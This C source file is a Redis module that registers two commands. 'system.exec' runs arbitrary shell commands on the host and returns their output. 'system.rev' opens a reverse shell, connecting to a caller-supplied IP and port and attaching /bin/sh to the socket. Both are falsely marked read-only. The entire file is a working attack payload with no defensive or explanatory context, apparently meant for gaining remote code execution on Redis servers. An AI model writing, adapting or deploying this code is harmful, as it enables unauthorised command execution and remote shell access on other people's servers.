#include "redismodule.h"
#include <stdio.h> 
#include <unistd.h>  
#include <stdlib.h> 
#include <string.h>    // Added for strlen, strcat
#include <sys/wait.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h> // Added for inet_addr

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc == 2) {
        size_t cmd_len;
        size_t buf_size = 1024;
        const char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);

        FILE *fp = popen(cmd, "r");
        if (!fp) return RedisModule_ReplyWithError(ctx, "ERR popen failed");

        char *buf = malloc(buf_size);
        char *output = calloc(1, buf_size); // Initialize to empty string

        while (fgets(buf, buf_size, fp) != NULL) { // Use buf_size, not sizeof(buf)
            if (strlen(buf) + strlen(output) >= buf_size - 1) {
                buf_size *= 2;
                output = realloc(output, buf_size);
            }
            strcat(output, buf);
        }

        RedisModule_ReplyWithSimpleString(ctx, output);
        free(buf);
        free(output);
        pclose(fp);
    } else {
        return RedisModule_WrongArity(ctx);
    }
    return REDISMODULE_OK;
}

int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc == 3) {
        size_t ip_len, port_len;
        const char *ip = RedisModule_StringPtrLen(argv[1], &ip_len);
        const char *port_s = RedisModule_StringPtrLen(argv[2], &port_len);
        int port = atoi(port_s);

        struct sockaddr_in sa;
        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr(ip);
        sa.sin_port = htons(port);
        
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
            dup2(s, 0);
            dup2(s, 1);
            dup2(s, 2);
            char *args[] = {"/bin/sh", NULL};
            execve("/bin/sh", args, NULL); // Correct arguments
        }
    }
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "system", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR) 
        return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.exec", DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    
    if (RedisModule_CreateCommand(ctx, "system.rev", RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    return REDISMODULE_OK; 
}
